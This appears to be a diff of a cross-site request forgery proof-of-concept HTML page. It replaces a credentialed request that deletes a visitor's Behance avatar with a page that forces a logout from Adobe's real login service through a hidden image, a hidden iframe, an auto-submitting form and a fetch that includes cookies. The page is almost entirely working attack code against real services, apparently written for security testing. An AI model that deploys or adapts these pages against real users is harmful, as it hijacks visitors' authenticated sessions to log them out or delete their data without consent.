@@ -1,17 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF Avatar Deletion</title>
+  <title>Logout Attempt</title>
 </head>
 <body>
-  <h1>Deleting your avatar...</h1>
+  <h1>Testing Forced Logout</h1>
 
+  <!-- Try 1: Image-based GET request -->
+  <img src="https://ims-na1.adobelogin.com/ims/logout/v1?client_id=SunbreakWebUI1" style="display:none;" alt="logout">
+
+  <!-- Try 2: Hidden iframe (often more reliable than <img>) -->
+  <iframe src="https://ims-na1.adobelogin.com/ims/logout/v1?client_id=SunbreakWebUI1" style="display:none;"></iframe>
+
+  <!-- Try 3: Auto-submit form (another GET request) -->
+  <form id="logoutForm" action="https://ims-na1.adobelogin.com/ims/logout/v1?client_id=SunbreakWebUI1" method="GET">
+    <input type="hidden" name="client_id" value="SunbreakWebUI1">
+  </form>
   <script>
-    fetch("https://cc-api-behance.adobe.io/v2/profile/avatar/", {
-      method: "DELETE",
-      credentials: "include"
-    }).then(res => {
-      console.log("Avatar delete response:", res.status);
+    document.getElementById("logoutForm").submit();
+  </script>
+
+  <!-- Try 4: JavaScript fetch (may or may not send cookies) -->
+  <script>
+    fetch("https://ims-na1.adobelogin.com/ims/logout/v1?client_id=SunbreakWebUI1", {
+      credentials: "include" // important: include cookies
     }).catch(console.error);
   </script>
 </body>
